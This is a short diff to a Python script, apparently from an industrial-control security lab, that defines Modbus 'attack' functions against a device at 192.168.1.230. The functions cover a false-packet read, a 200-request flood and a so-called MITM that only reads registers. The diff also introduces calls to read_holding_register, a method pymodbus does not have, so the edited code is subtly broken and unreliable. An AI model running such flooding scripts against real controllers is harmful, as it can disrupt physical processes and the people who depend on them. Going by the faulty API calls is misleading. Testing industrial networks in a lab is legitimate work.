@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-from pymodbus.client.sync import ModbusTcpClient as ModbusClient
+from pymodbus.client import ModbusTcpClient as ModbusClient
 
 from datetime import datetime
 
@@ -13,7 +13,7 @@ def False_Packet_Attack():
     client = ModbusClient('192.168.1.230')
     client.connect()
     try:
-        client.read_input_registers(1, 2100)
+        client.read_holding_registers(1, 2100)
     except:
         pass
     
@@ -33,7 +33,7 @@ def begin_flood():
     client = ModbusClient('192.168.1.230')
     client.connect()
     for i in range(200):
-        client.read_input_registers(1, 5, unit=1)
+        client.read_holding_register(1, 5, unit=1)
 
     print("Modbus Network Flood Attempted - sent 200 packets \n")
     print("Time Stamp: " + str(time.time()))
@@ -49,7 +49,7 @@ def begin_flood():
 def mitm_attack():
     client = ModbusClient('192.168.1.230')
     client.connect()
-    client.read_input_registers(1, 5, unit=1)
+    client.read_holding_register(1, 5, unit=1)
 
     print("Modbus MITM Attempted \n")
     print("Time Stamp: " + str(time.time()))
